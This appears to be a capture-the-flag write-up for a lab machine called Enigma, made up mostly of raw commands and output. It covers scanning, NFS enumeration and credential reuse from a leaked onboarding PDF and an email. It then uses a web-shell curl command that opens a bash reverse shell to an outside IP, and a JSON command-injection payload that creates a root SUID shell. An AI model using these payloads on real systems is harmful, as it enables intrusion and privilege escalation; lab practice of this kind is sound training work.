
```

nmap -sCV -Pn 10.129.239.191
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 10:19 -0400
Nmap scan report for 10.129.239.191
Host is up (0.20s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_pop3-capabilities: TOP UIDL CAPA SASL RESP-CODES STLS AUTH-RESP-CODE PIPELINING
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36855/tcp   mountd
|   100005  1,2,3      54849/tcp6  mountd
|   100005  1,2,3      56742/udp   mountd
|   100005  1,2,3      58299/udp6  mountd
|   100021  1,3,4      36873/tcp6  nlockmgr
|   100021  1,3,4      43539/tcp   nlockmgr
|   100021  1,3,4      44631/udp   nlockmgr
|   100021  1,3,4      55909/udp6  nlockmgr
|   100024  1          33511/udp   status
|   100024  1          43925/udp6  status
|   100024  1          46341/tcp6  status
|   100024  1          47009/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp  open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: capabilities LITERAL+ post-login ID ENABLE more AUTH=PLAINA0001 have listed Pre-login IDLE SASL-IR LOGIN-REFERRALS OK IMAP4rev1
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: TOP UIDL CAPA SASL(PLAIN) RESP-CODES AUTH-RESP-CODE USER PIPELINING
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs_acl  3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```


<img width="1920" height="716" alt="image" src="https://github.com/user-attachments/assets/605c07e8-5c25-4e09-9eae-088b72d0c774" />




```
ffuf -u http://enigma.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.enigma.htb" -fs 154

```

<img width="1840" height="749" alt="image" src="https://github.com/user-attachments/assets/7692e83c-887e-4e4a-a716-8d32a8e02732" />



<img width="1910" height="753" alt="image" src="https://github.com/user-attachments/assets/f4e8eb15-c544-4b26-ab6d-9e56514805aa" />




```
(root㉿kali)-[/home/kali/Desktop/HTB]
└─# showmount -e 10.129.239.191                                                             
Export list for 10.129.239.191:
/srv/nfs/onboarding *

┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# mkdir -p /tmp/onboarding

┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# mount -t nfs 10.129.239.191:/srv/nfs/onboarding /tmp/onboarding -o ro


┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# ls -la /tmp/onboarding
total 8
drwxr-xr-x  2 root root 4096 Feb 19 14:54 .
drwxrwxrwt 15 root root  400 Aug  5 10:47 ..
-rw-r--r--  1 root root 1751 Feb 19 14:53 New_Employee_Access.pdf

┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# cp /tmp/onboarding/New_Employee_Access.pdf ~/Enigma/
cp: cannot create regular file '/root/Enigma/': Not a directory

```


```
mkdir -p ~/Enigma
cp /tmp/onboarding/New_Employee_Access.pdf ~/Enigma/

```




<img width="1774" height="600" alt="image" src="https://github.com/user-attachments/assets/9f133d0e-d8db-44eb-9095-a950014dd7d0" />


<img width="1411" height="164" alt="image" src="https://github.com/user-attachments/assets/9119f350-ca39-41bd-b627-4d9ab7c5207a" />


```
d ~/Enigma
pdftotext New_Employee_Access.pdf New_Employee_Access.txt
cat New_Employee_Access.txt
Enigma Corp
IT Department - New Employee System Access

Employee:

Kevin Mitchell

Department:

Operations

Provisioned by:

IT Department

Date:

2024-03-01

Webmail Access
URL:

http://mail001.enigma.htb

Username:

kevin

Password:

Enigma2024!

Please change your password upon first login.
For support contact: it@enigma.htb
This document contains confidential internal information intended solely for the recipient.
Unauthorized access, disclosure, or distribution is strictly prohibited.
Generated automatically by Enigma Corp Identity Management System.


```


<img width="1912" height="820" alt="image" src="https://github.com/user-attachments/assets/e385146c-658c-4282-ac63-010e0602949b" />




<img width="1911" height="767" alt="image" src="https://github.com/user-attachments/assets/30548d15-84cc-42c7-a757-77ff9e67e9bd" />

  
Apologies for the delay. I have provisioned your access. Please find the details below:  
  
URL: [http://support_001.enigma.htb](http://support_001.enigma.htb)  
Username: admin  
Password: Ne3s4rtars78s  
  
Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.  
  
Regards,  
IT Support  
Enigma Corp


<img width="1900" height="901" alt="image" src="https://github.com/user-attachments/assets/1a682752-ba0e-4e15-a146-e6f25e6c26dc" />



<img width="1901" height="832" alt="image" src="https://github.com/user-attachments/assets/421ba80d-7bde-46ad-b3ae-3590c7514be3" />




```
`curl "http://support_001.enigma.htb/files/shell.php?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.15.132/4444%200>%261'"`


```



![[Pasted image 20260806022205.png]]

![[Pasted image 20260806022405.png]]


![[Pasted image 20260806022435.png]]


![[Pasted image 20260806022724.png]]



![[Pasted image 20260806022636.png]]



![[Pasted image 20260806022800.png]]

![[Pasted image 20260806022818.png]]


![[Pasted image 20260806022838.png]]


![[Pasted image 20260806023312.png]]



![[Pasted image 20260806023327.png]]



```

netstat -tulpn | grep 1337
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
haris@enigma:/$ cat > /tmp/payload.json <<'EOF'.0.0:*               LISTEN      -                   
haris@enigma:/$ cat > /tmp/payload.json <<'EOF'
{
{
  "bindingId": "backup_database",
  "bindingId": "backup_database",
  "arguments": [
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"}, 
    {"name": "db_pass", "value": "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"}, 
    {"name": "db_name", "value": "production"}
    {"name": "db_name", "value": "production"}
  ]
  ]
}
}
EOF
haris@enigma:/$ curl -s -X POST http://127.0.0.1:1337/api/StartAction \

  -H 'Content-Type: application/json' \

  --data @/tmp/payload.json
-H: command not found
--data: command not found
haris@enigma:/$ ls -la /tmp/.bs
ls: cannot access '/tmp/.bs': No such file or directory
haris@enigma:/$ /tmp/.bs -p
bash: /tmp/.bs: No such file or directory
haris@enigma:/$ cat /tmp/payload.json

{

  "bindingId": "backup_database",

  "arguments": [

    {"name": "db_user", "value": "backup_svc"},

    {"name": "db_pass", "value": "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"},

    {"name": "db_name", "value": "production"}

  ]

}
   curl -s -X POST http://127.0.0.1:1337/api/StartAction -H 'Content-Type: application/json' --data @/tmp/payload.json
{"executionTrackingId":"66032262-0d71-41a7-8ce7-d2571a51253d"}haris@enigma:/$ ent-Type: application/json' --data @/tmp/payload.json
haris@enigma:/$ curl -i http://127.0.0.1:1337/api/
HTTP/1.1 404 Not Found
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Wed, 05 Aug 2026 20:16:23 GMT
Content-Length: 19

404 page not found
haris@enigma:/$ curl -i http://127.0.0.1:1337/
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 2371
Content-Type: text/html; charset=utf-8
Last-Modified: Wed, 04 Mar 2026 09:48:38 GMT
Date: Wed, 05 Aug 2026 20:16:35 GMT

<!DOCTYPE html>

<html lang = "en">
        <head>
                <meta charset = "UTF-8" />
                <meta name = "viewport" content = "width=device-width, initial-scale=1.0" />
                <meta name = "description" content = "Give safe and simple access to predefined shell commands from a web interface." />

                <title>OliveTin</title>


                <link rel = "shortcut icon" type = "image/png" href = "/assets/OliveTinLogo-jRx-Gghe.png" />

                <link rel = "apple-touch-icon" sizes="57x57" href="/assets/OliveTinLogo-57px-B3yOXIxP.png" />
                <link rel = "apple-touch-icon" sizes="120x120" href="/assets/OliveTinLogo-120px-BZ3kS-xp.png" />
                <link rel = "apple-touch-icon" sizes="180x180" href="/assets/OliveTinLogo-180px-DBoTqUbn.png" />

                <base href = "/" />
                <script type="module" crossorigin src="/assets/index-Cr_VwSNJ.js"></script>
                <link rel="stylesheet" crossorigin href="/assets/index-BzcwB5yK.css">
        </head>

        <body>
                <slot id = "app" />

                <noscript>
                        <div class = "error">Sorry, JavaScript is required to use OliveTin.</div>
                </noscript>

                <dialog title = "Big Error Message" id = "big-error" class = "error padded-content">

                </dialog>

                <script type = "text/javascript">
                        const bigErrorDialog = document.getElementById('big-error')

                        /**
                        This is the bootstrap code, which relies on very simple, old javascript
                        to at least display a helpful error message if we can't use OliveTin.
                         */
                        window.showBigError = function (type, friendlyType, message, isFatal) {
                                console.error('Error ' + type + ': ', message)
                                return;

                                bigErrorDialog.innerHTML = '<h1>Error ' + friendlyType + '</h1><p>' + message + "</p><p><a href = 'http://docs.olivetin.app/troubleshooting/err-" + type + ".html' target = 'blank'/>" + type + " error in OliveTin Documentation</a></p>"

                                if (isFatal) {
                                        bigErrorDialog.innerHTML += '<p>You will need to refresh your browser to clear this message.</p>'
                                } else {
                                        bigErrorDialog.innerHTML += '<p>This error message will go away automatically if the problem is solved.</p>'
                                }

                                bigErrorDialog.showModal()

                                console.error('Error ' + type + ': ', message)
                        }

                        window.clearBigErrors = function () {
                                bigErrorDialog.close()
                        }
                </script>

                <script type = "text/javascript" nomodule>
                        showBigError("js-modules-not-supported", "Sorry, your browser does not support JavaScript modules.", null)
                </script>

        </body>
</html>
haris@enigma:/$ curl -s -X POST \
  -H 'Content-Type: application/json' \
  --data '{"executionTrackingId":"66032262-0d71-41a7-8ce7-d2571a51253d"}' \
  http://127.0.0.1:1337/api/GetActionLogs
{"logs":[], "couls -l /tmp/.bs0", "pageSize":"10", "totalCount":"0", "startOffset":"0"}haris@enigma:/$ ls -l /tmp/.bs
stat /tmp/.bs
find /tmp -maxdepth 1 -name '.bs' -ls
-rwsr-xr-x 1 root root 1446024 Aug  5 20:16 /tmp/.bs
  File: /tmp/.bs
  Size: 1446024         Blocks: 2832       IO Block: 4096   regular file
Device: 8,4     Inode: 73307       Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2026-08-05 20:16:12.485551218 +0000
Modify: 2026-08-05 20:16:12.486551218 +0000
Change: 2026-08-05 20:16:12.486551218 +0000
 Birth: 2026-08-05 20:16:12.485551218 +0000
    73307   1416 -rwsr-xr-x   1 root     root      1446024 Aug  5 20:16 /tmp/.bs
haris@enigma:/$ /tmp/.bs -p
.bs-5.2# ls
bin                dev   lib64              mnt   run                 srv  var
bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin                sys
boot               home  lost+found         proc  sbin.usr-is-merged  tmp
cdrom              lib   media              root  snap                usr
.bs-5.2# cd root
.bs-5.2# ls
root.txt
.bs-5.2# root
.bs: root: command not found
.bs-5.2# 
.bs-5.2# 
.bs-5.2# cat root.txx
cat: root.txx: No such file or directory
.bs-5.2# cat root.txt
decd6a9383f37124e2686863cac3f87a
.bs-5.2# 
.bs-5.2# 

```



```
https://marcoscarmona.dev/blog/enigma_htb/

https://h4ckr00t.com/posts/enigma/

```
